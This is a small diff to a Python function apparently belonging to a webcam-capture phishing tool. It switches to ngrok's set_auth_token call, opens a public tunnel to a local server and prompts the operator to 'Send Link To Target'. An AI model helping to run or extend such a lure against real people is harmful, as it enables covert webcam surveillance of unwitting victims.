@@ -71,7 +71,8 @@ def webcham():
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
   banner.banner()
   token=str(input("Input authtoken ngrok: "))
-  a = ngrok.connect(4545,"http",auth_token=token)
+  ngrok.set_auth_token(f"{token}")
+  a = ngrok.connect(4545,"http")
   print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
   print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
